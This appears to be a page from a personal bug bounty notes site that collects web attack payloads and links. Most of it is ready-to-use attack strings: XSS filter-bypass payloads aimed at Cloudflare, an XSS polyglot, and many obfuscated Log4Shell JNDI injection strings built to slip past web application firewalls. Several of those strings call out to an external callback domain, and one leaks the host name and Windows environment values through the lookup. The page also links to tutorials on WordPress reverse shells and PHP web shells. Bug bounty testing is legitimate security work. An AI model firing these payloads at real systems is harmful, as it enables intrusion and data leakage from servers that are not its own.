---
title: "Bug Bounty Tips"
draft: false
images: []
description: "Some bug bounty tips from different sources"
lead: "Some bug bounty tips from different sources"
menu:
  docs:
    parent: "Wapp"
weight: 200
toc: true
---

### XSS Cloudflare Bypass
```
🚨 New CloudFlare XSS Bypass! 🚨

<svg onload=alert%26%230000000040"1")>
Dec: <svg onload=prompt%26%230000000040document.domain)>
Hex: <svg onload=prompt%26%23x000000028;document.domain)>
```

### XSS Polyglot
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

### Pentesting Wordpress
```
https://hackingarticles.in/wordpress-pentest-lab-setup-in-multiple-ways/

https://hackingarticles.in/multiple-ways-to-crack-wordpress-login/

https://hackingarticles.in/wordpress-reverse-shell/

https://hackingarticles.in/wpscanwordpress-pentesting-framework/
```

### Uploading various PHP Web Shells 
```
https://www.hackingarticles.in/web-shells-penetration-testing/
```
---

### Log4Shell
#### Test Vulnerable Apps
```
1. Generate a DNS token https://canarytokens.org/generate# or use burp collaborator
2. Wrap that token in 
Prefix: ${jndi:ldap://
Suffix: /a}
3. Use that value in search forms, profile data, settings etc. of your apps
4. Get notified when you triggered a reaction

https://twitter.com/cyb3rops/status/1469405846010572816
```

#### Valid Email
```
For educational purposes only: test+(${jndi:ldap://test/a})@gmail.com is a valid RFC822 Email Address

https://twitter.com/lean0x2f/status/1469233245715849218
```
#### WAF Bypass
```
${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://asdasd.asdasd.asdasd/poc}
${${::-j}ndi:rmi://asdasd.asdasd.asdasd/ass}
${jndi:rmi://adsasd.asdasd.asdasd}
${${lower:jndi}:${lower:rmi}://adsasd.asdasd.asdasd/poc}
${${lower:${lower:jndi}}:${lower:rmi}://adsasd.asdasd.asdasd/poc}
${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://adsasd.asdasd.asdasd/poc}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://xxxxxxx.xx/poc}
${jndi:ldap://127.0.0.1:1389/ badClassName} 
${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk/sploit} 
${${::-j}ndi:rmi://nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk/sploit} 
${jndi:rmi://nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk}
${${lower:jndi}:${lower:rmi}://nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk/sploit} 
${${lower:${lower:jndi}}:${lower:rmi}://nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk/sploit} 
${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk/sploit}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk/sploit}
${${upper:jndi}:${upper:rmi}://nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk/sploit} 
${${upper:j}${upper:n}${lower:d}i:${upper:rmi}://nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk/sploit}
${${upper:j}${upper:n}${upper:d}${upper:i}:${lower:r}m${lower:i}}://nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk/sploit}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://${hostName}.nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk}
${${upper::-j}${upper::-n}${::-d}${upper::-i}:${upper::-l}${upper::-d}${upper::-a}${upper::-p}://${hostName}.nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://${hostName}.${env:COMPUTERNAME}.${env:USERDOMAIN}.${env}.nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk}
```
#### Log4j Keywords
```
${ctx:loginId}
${map:type}
${filename}
${date:MM-dd-yyyy}
${docker:containerId}
${docker:containerName}
${docker:imageName}
${env:USER}
${event:Marker}
${mdc:UserId}
${java:runtime}
${java:vm}
${java:os}
${jndi:logging/context-name}
${hostName}
${docker:containerId}
${k8s:accountName}
${k8s:clusterName}
${k8s:containerId}
${k8s:containerName}
${k8s:host}
${k8s:labels.app}
${k8s:labels.podTemplateHash}
${k8s:masterUrl}
${k8s:namespaceId}
${k8s:namespaceName}
${k8s:podId}
${k8s:podIp}
${k8s:podName}
${k8s:imageId}
${k8s:imageName}
${log4j:configLocation}
${log4j:configParentLocation}
${spring:spring.application.name}
${main:myString}
${main:0}
${main:1}
${main:2}
${main:3}
${main:4}
${main:bar}
${name}
${marker}
${marker:name}
${spring:profiles.active[0]
${sys:logPath}
${web:rootDir}
```

#### Security Advisories / Bulletins linked to Log4Shell (CVE-2021-44228)

```
https://gist.github.com/SwitHak/b66db3a06c2955a9cb71a8718970c592
```

### Bug Bounty with Android Mobile
```
https://twitter.com/rootxyash/status/1482968235138228228
```

### Wordpress Common Vulnerabilities
```
https://twitter.com/rootxyash/status/1478313618730983424
```